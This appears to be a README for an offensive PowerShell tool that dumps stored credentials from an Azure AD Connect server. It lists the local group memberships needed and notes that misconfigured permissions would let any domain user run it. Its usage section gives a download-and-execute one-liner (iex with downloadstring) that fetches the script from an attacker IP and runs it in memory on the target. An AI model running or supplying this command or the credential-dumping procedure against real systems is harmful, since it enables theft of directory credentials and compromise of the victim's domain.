# Dump-AADConnect-Credentials

## Requirements

This script must be executed **locally** on the server running the Azure AD Connect service.

For the script to successfully dump credentials, it must be run by a user who has permissions to:
1.  Read the local `ADSync` (SQL Express) database.
2.  Access the `adcrypt.dll` decryption keys.

By default, this permission is granted to members of the following **local groups** on the server:

* **`Administrators`**
* **`ADSyncAdmins`**

### 💡 A Note on Misconfigurations

In some environments, these permissions may be incorrectly assigned. For example, if the `Authenticated Users` group was given read access to the database or decryption keys, this script could be run by *any* domain user, which is a critical vulnerability.

1. Download dump-azureADConnect-creds.ps1 to target running ADCConnect.

2. iex(new-object net.webclient).downloadstring('http://10.10.14.3/dump-azureADConnect-creds.ps1')

<img width="2724" height="315" alt="image" src="https://github.com/user-attachments/assets/17aab48a-0772-4356-9ca1-6792d07929a1" />
